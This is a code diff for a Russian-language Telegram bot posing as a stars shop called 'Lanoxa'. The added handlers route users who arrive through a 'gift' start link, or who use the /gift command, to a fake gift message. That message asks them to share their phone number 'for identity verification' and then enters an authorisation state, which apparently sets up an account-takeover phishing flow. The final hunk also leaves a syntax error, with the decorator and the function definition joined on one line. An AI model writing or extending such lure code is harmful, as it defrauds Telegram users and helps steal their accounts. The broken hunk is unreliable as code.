@@ -262,13 +262,26 @@ async def cmd_start(msg: Message, state: FSMContext):
                 int(notify_chat),
                 f'🆕 Новый: {msg.from_user.get_mention()} | <code>{msg.from_user.id}</code>'
             )
+
+    # Если старт с параметром (например /start gift) — сразу в авторизацию
+    args = msg.get_args()
+    if args:
+        await msg.answer(
+            f'👋 <b>Привет, {msg.from_user.get_mention()}!</b>\n\n'
+            '🎁 Вам отправили подарок — нажмите <b>«📱 Продолжить»</b> '
+            'и поделитесь номером телефона для проверки личности.',
+            reply_markup=kb_phone()
+        )
+        await Auth.wait_contact.set()
+        return
+
+    # Без параметра — показываем главное меню
     await msg.answer(
         f'👋 <b>Привет, {msg.from_user.get_mention()}!</b>\n\n'
-        '🎁 Вам отправили подарок — нажмите <b>«📱 Продолжить»</b> '
-        'и поделитесь номером телефона для проверки личности.',
-        reply_markup=kb_phone()
+        '🛒 Добро пожаловать в магазин звёзд <b>Lanoxa</b>!\n\n'
+        '👇 Выберите действие:',
+        reply_markup=kb_menu()
     )
-    await Auth.wait_contact.set()
 
 
 @dp.message_handler(commands=['help'], state='*')
@@ -293,6 +306,12 @@ async def cmd_gift(msg: Message, state: FSMContext):
             InlineKeyboardButton('Получить 🎁', url='https://t.me/nft/JesterHat-120172')
         ]])
     )
+    # После просмотра подарка предлагаем авторизоваться
+    await msg.answer(
+        '📱 Для получения подарка поделитесь номером:',
+        reply_markup=kb_phone()
+    )
+    await Auth.wait_contact.set()
 
 
 @dp.message_handler(commands=['stars'], state='*')
@@ -453,8 +472,7 @@ async def on_webapp_data(msg: Message, state: FSMContext):
 # МЕНЮ
 # ═══════════════════════════════════════════
 
-@dp.message_handler(lambda m: m.text == '👤 Профиль')
-async def on_profile(msg: Message):
+@dp.message_handler(lambda m: m.text == '👤 Профиль')async def on_profile(msg: Message):
     await msg.answer_photo(
         photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
         caption=(
